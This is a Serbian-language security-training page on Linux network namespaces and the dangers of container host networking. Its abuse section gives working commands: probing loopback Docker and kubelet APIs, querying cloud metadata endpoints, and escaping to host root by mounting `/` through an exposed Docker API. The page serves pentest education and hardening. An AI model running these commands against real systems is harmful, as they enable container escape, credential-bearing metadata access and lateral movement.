# Mrežni namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mrežni namespace izoluje resurse vezane za mrežu kao što su interfejsi, IP adrese, tabele rutiranja, ARP/neighbor stanje, pravila vatrozida, socketi i sadržaj fajlova kao što je `/proc/net`. Zato container može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj, a da pritom ne poseduje stvarni mrežni stack hosta.

Sa aspekta bezbednosti, ovo je važno jer mrežna izolacija podrazumeva mnogo više od vezivanja portova. Privatni network namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, container može iznenada dobiti uvid u host listeners, host-local services i network control points koji nikada nisu trebali biti izloženi aplikaciji.

## Operacija

Novo kreiran network namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem dok mu se ne pridruže interfejsi. Container runtimes potom kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute tako da workload ima očekivanu konektivnost. U deploy-ima zasnovanim na bridge-u, to obično znači da container vidi veth-podržani interfejs povezan na host bridge. U Kubernetes, CNI plugin-ovi obavljaju ekvivalentno podešavanje za Pod networking.

Ova arhitektura objašnjava zašto `--network=host` ili `hostNetwork: true` predstavlja tako drastičnu promenu. Umesto da dobije pripremljeni privatni mrežni stack, workload se priključuje na stvarni stack hosta.

## Lab

Možete videti skoro prazan network namespace pomoću:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Možete uporediti normalne i host-networked containers sa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontejner koji koristi host network više nema sopstveni izolovani prikaz socket-a i interfejsa. Sama ta promena je značajna čak i pre nego što se zapitate koje capabilities proces ima.

## Korišćenje u runtime-u

Docker i Podman obično kreiraju privatni network namespace za svaki kontejner, osim ako nije drugačije podešeno. Kubernetes obično dodeljuje svakom Pod-u njegov network namespace, koji se deli između kontejnera unutar tog Pod-a ali je odvojen od host-a. Incus/LXC sistemi takođe obezbeđuju bogatu izolaciju zasnovanu na network namespace, često sa širim spektrom virtuelnih mrežnih konfiguracija.

Opšte pravilo je da je privatno umrežavanje podrazumevana granica izolacije, dok je korišćenje host mreže eksplicitno odustajanje od te granice.

## Pogrešne konfiguracije

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, niskonivouskog nadzora ili praktičnosti, ali time se briše jedna od najčistijih granica dostupnih kontejnerima. Host-local slušaoci postaju dostupniji direktnim putem, localhost-only servisi mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasniji jer se operacije koje omogućavaju sada primenjuju na mrežno okruženje samog host-a.

Drugi problem je prekomerno dodeljivanje network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw sockets ili naprednu kontrolu mreže bezopasnim.

## Zloupotreba

U slabo izolovanim okruženjima, napadači mogu pregledati servise koji slušaju na host-u, dohvatiti management endpoint-e vezane samo za loopback, sniff-ovati ili ometati saobraćaj u zavisnosti od tačnih capabilities i okruženja, ili rekonfigurisati rutiranje i stanje firewall-a ako je prisutan `CAP_NET_ADMIN`. U klasteru, ovo takođe može olakšati lateral movement i control-plane reconnaissance.

Ako sumnjate na korišćenje host mreže, počnite tako što ćete potvrditi da vidljivi interfejsi i slušaoci pripadaju host-u, a ne izolovanoj kontejnerskoj mreži:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Servisi koji su dostupni samo na loopback interfejsu često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ako su prisutne network capabilities, testirajte da li workload može da pregleda ili izmeni vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
U klasterskim ili cloud okruženjima, host networking takođe opravdava brzo lokalno recon metapodataka i control-plane-adjacent servisa:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Potpun primer: Host Networking + Local Runtime / Kubelet Access

Host networking ne daje automatski host root, ali često izlaže servise koji su namerno dostupni samo sa samog čvora. Ako je jedan od tih servisa slabo zaštićen, host networking postaje direktan privilege-escalation put.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Uticaj:

- direktno kompromitovanje hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- cluster reconnaissance or lateral movement ako su kubelet ili lokalni agenti dostupni
- manipulacija saobraćajem or denial of service kada se kombinuje sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da saznate da li proces ima privatni mrežni stack, koje rute i listener-i su vidljivi, i da li mrežni prikaz već izgleda kao host pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Zanimljivo ovde:

- Ako identifikator network namespace-a ili vidljivi skup interfejsa izgleda kao host, host networking možda je već u upotrebi.
- `ss -lntup` je posebno vredan jer otkriva slušače koji rade samo na loopback interfejsu i lokalne upravljačke krajnje tačke.
- Rute, nazivi interfejsa i kontekst firewall-a postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN` ili `CAP_NET_RAW`.

Prilikom pregleda containera, uvek procenjujte network namespace zajedno sa capability set-om. Host networking u kombinaciji sa snažnim mrežnim capability-ima predstavlja sasvim drugačiju poziciju od bridge networking-a sa uskim podrazumevanim skupom capability-a.
